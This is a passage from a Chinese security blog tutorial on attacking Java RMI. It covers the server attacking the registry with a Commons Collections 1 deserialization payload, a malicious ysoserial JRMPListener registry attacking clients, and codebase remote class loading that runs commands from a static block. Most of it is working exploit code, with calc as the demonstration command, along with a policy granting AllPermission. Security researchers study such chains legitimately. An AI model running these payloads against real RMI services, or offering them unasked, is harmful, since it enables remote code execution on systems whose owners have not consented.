<h2 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h2><p>攻击原理：和客户端差不多，服务端主要使用bind函数把远程对象序列化的方式传给注册中心，注册中心通过网络连接对其反序列化，那么如果服务端bind的时候传一个恶意对象，就会导致注册中心反序列化触发RCE。<br><strong>详情见：注册中心接受并处理服务端绑定请求</strong><br>这里还有个问题，bind函数的参数要求是Remote类型的，而我们CC链构造的是Object类型的，这里我们用到的是动态代理，把恶意对象封装成Remote类型的动态代理对象传进去。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        	<span class="comment">// dynamic proxy cast to Remote type</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">evilObject</span> <span class="operator">=</span> getCCPayload();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remoteObject</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, (InvocationHandler) evilObject));</span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行Server端启动代码，成功执行CC1.<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1695123613051-9d8de0bf-703c-45c5-a0bd-96412a54b762.png#averageHue=%2365502e&clientId=u67350b10-c0b9-4&from=paste&height=789&id=u5ee3621a&originHeight=1578&originWidth=2873&originalType=binary&ratio=2&rotation=0&showTitle=false&size=406071&status=done&style=none&taskId=ub4bb799b-a340-412d-b446-ff7b1ba3ee3&title=&width=1436.5" alt="image.png"></p>
<h2 id="注册中心攻击客户-服务端"><a href="#注册中心攻击客户-服务端" class="headerlink" title="注册中心攻击客户&#x2F;服务端"></a>注册中心攻击客户&#x2F;服务端</h2><p>攻击原理：这里实际上是利用JRMP协议进行攻击，也就是RMI中的网络通信协议，它在建立连接的时候，注册中心会给请求连接的一端（Server&#x2F;Client）发送一些序列化的数据，然后请求连接的一段对其进行反序列化。<br>这就意味着，只要服务端或者客户端获取到 Registry，并且执行了list、unbind、lookup 、rebind、bind方法之一，自身就会被RCE。<br><strong>本质上其实是JRMP协议的服务端对JRMP协议的客户端的攻击。</strong><br>这里我们在终端，用ysoserial起一个恶意注册中心：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-cp</span> .\ysoserial<span class="literal">-all</span>.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections6 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure>
<p>以Client端为例，让Client端获取到恶意注册中心的代理对象，同时执行lookup</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;10.202.12.129&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        <span class="comment">//        stub.sayHello(&quot;I&#x27;m jasper you motherfucker.&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>成功RCE，执行CC6并且弹出计算器<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1695127453684-7e7aa852-5167-47aa-8919-b447b0bf46e1.png#averageHue=%2371bf62&clientId=u67350b10-c0b9-4&from=paste&height=657&id=u14236e68&originHeight=1314&originWidth=2815&originalType=binary&ratio=2&rotation=0&showTitle=false&size=241552&status=done&style=none&taskId=u9a3fb587-a1f8-4ff7-96cc-fd7418086fb&title=&width=1407.5" alt="image.png"><br>服务端同理，不再演示。</p>
<h2 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h2><p>攻击原理：java.rmi.server.codebase简单来说就是远程的classpath，当RMI的流程出现本地加载不到类的时候，会选择从codebase去加载，也就是远程include代码，显然存在很大漏洞隐患，触发加载远程类有下面的情况：</p>
<ul>
<li>Server端函数的返回类型为接口定义类型的子类，Client端接收返回结果时找不到子类</li>
<li>Client端传参时传接口定义类型的子类，Server端接收参数时找不到子类</li>
</ul>
<p>注意：无论是客户端还是服务端要远程加载类，都需要满足以下条件：</p>
<ul>
<li>java.rmi.server.useCodebaseOnly 要设置为false，从JDK 6u45、7u21开始的默认值就是true</li>
<li>配置policy文件规则，允许从远程加载类库</li>
<li>配置RMISecurityManager</li>
</ul>
<h3 id="攻击Client端"><a href="#攻击Client端" class="headerlink" title="攻击Client端"></a>攻击Client端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;new http request from &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot; &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> HTTPServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="keyword">while</span> (inputStream.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(inputStream.read());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            httpExchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            httpExchange.getResponseBody().write(bytes);</span><br><span class="line">            httpExchange.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        com.sun.net.httpserver.<span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> com.sun.net.httpserver.HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8000</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;String HTTP Server on port: 8000&quot;</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HTTPServer</span>());</span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">//这里由于在static代码块中，无法直接抛异常外带数据，不过有其他方式外带数据，可以自己查找下。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            sb += lineStr + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(sb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulnFunc</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ExportObject <span class="title function_">vulnFunc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ExportObject</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置codebase</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectImpl</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulnFunc</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// JDK 6u45、7u21之后，需要设置useCodebaseOnly</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        <span class="comment">// 配置policy文件以允许从远程加载类库</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>,<span class="string">&quot;D://java.policy&quot;</span>);</span><br><span class="line">        <span class="comment">// 开启RMISecurityManager</span></span><br><span class="line">        <span class="type">RMISecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        stub.vulnFunc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>先运行HTTPServer启动代码，起一个codebase，然后运行Server端启动代码，再运行Client端启动代码<br>成功执行HTTPServer的恶意返回结果子类的静态代码块。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1695169373115-8cd40489-01fd-40f3-86a3-950eb76d73aa.png#averageHue=%2394a87e&clientId=u7cc6a79c-6869-4&from=paste&height=676&id=u14c194c0&originHeight=1352&originWidth=2861&originalType=binary&ratio=2&rotation=0&showTitle=false&size=381600&status=done&style=none&taskId=u18f4e205-3d26-485a-a90a-96cb0f14604&title=&width=1430.5" alt="image.png"></p>
<h3 id="攻击Server端"><a href="#攻击Server端" class="headerlink" title="攻击Server端"></a>攻击Server端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;new http request from &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot; &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> HTTPServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="keyword">while</span> (inputStream.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(inputStream.read());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            httpExchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            httpExchange.getResponseBody().write(bytes);</span><br><span class="line">            httpExchange.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        com.sun.net.httpserver.<span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> com.sun.net.httpserver.HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8000</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;String HTTP Server on port: 8000&quot;</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HTTPServer</span>());</span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
